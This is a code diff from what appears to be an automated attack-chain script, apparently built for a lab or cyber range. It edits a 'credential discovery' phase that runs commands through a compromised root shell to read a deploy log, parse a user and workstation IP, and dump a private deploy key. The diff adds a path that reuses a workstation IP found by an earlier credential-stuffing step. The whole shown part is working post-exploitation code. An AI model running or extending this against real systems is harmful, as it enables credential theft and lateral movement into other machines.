@@ -158,17 +158,23 @@ def run(root_shell, kali_host=KALI_HOST, workstation_ip=WORKSTATION_IP,
     # ------------------------------------------------------------------
     # Phase 1 — Credential discovery: deploy.log + private key on apache
     # ------------------------------------------------------------------
-    print(f"[*] Reading deploy log: {DEPLOY_LOG_PATH}")
-    log_content = _run_remote(root_shell, f"cat {DEPLOY_LOG_PATH}")
-
-    match = re.search(r"([\w.]+)@(\d+\.\d+\.\d+\.\d+)", log_content)
-    if match:
-        workstation_user = match.group(1)
-        workstation_ip   = match.group(2)
-        print(f"[+] Found deploy identity: {workstation_user}@{workstation_ip}")
+    # If the credential-stuffing step already identified the workstation IP
+    # (passed in via kwargs), trust it; otherwise fall back to parsing
+    # deploy.log so this module remains runnable standalone.
+    if workstation_ip and workstation_ip != WORKSTATION_IP:
+        print(f"[+] Using workstation IP from prior step: {workstation_user}@{workstation_ip}")
     else:
-        print(f"[!] Could not parse deploy.log; using defaults "
-              f"({workstation_user}@{workstation_ip})")
+        print(f"[*] Reading deploy log: {DEPLOY_LOG_PATH}")
+        log_content = _run_remote(root_shell, f"cat {DEPLOY_LOG_PATH}")
+
+        match = re.search(r"([\w.]+)@(\d+\.\d+\.\d+\.\d+)", log_content)
+        if match:
+            workstation_user = match.group(1)
+            workstation_ip   = match.group(2)
+            print(f"[+] Found deploy identity: {workstation_user}@{workstation_ip}")
+        else:
+            print(f"[!] Could not parse deploy.log; using defaults "
+                  f"({workstation_user}@{workstation_ip})")
 
     print(f"[*] Reading deploy key: {REMOTE_KEY_PATH}")
     raw_key = _run_remote(root_shell, f"cat {REMOTE_KEY_PATH}", timeout=10)
